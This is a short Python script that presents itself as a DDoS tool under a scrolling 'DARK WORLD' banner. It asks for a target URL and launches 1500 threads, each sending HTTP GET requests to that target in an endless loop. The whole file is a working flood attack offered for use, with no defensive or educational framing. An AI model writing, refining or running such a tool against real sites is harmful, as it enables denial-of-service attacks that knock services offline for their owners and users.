import requests
import threading
import time
import curses

# Function to send HTTP requests
def send_request(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Sent request to {url}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {url}: {e}")

# Function to animate the banner
def animate_banner(stdscr):
    curses.curs_set(0)
    stdscr.nodelay(1)

    # Define the banner text
    banner_text = "DARK WORLD"
    banner_length = len(banner_text)

    # Calculate the center position of the banner
    height, width = stdscr.getmaxyx()
    x = width // 2 - banner_length // 2
    y = height // 2

    # Animate the banner
    while True:
        stdscr.clear()
        stdscr.addstr(y, x, banner_text, curses.A_BOLD)
        stdscr.refresh()
        time.sleep(0.5)
        banner_text = banner_text[1:] + banner_text[0]

# Main function
def main():
    # Initialize the curses screen
    stdscr = curses.initscr()

    # Start the banner animation in a separate thread
    banner_thread = threading.Thread(target=animate_banner, args=(stdscr,))
    banner_thread.start()

    # Display creator information
    print("Creator: Rahad Hasan")

    # Get the target URL from the user
    target_url = input("Enter the target URL: ")

    # Start the DDoS attack
    print("Starting DDoS attack...")
    for _ in range(1500):
        # Create a new thread for each request
        thread = threading.Thread(target=send_request, args=(target_url,))
        thread.start()

    # Wait for the banner animation to complete
    banner_thread.join()

    # End the curses screen
    curses.endwin()

# Run the script when executed as the main program
if __name__ == "__main__":
    main()
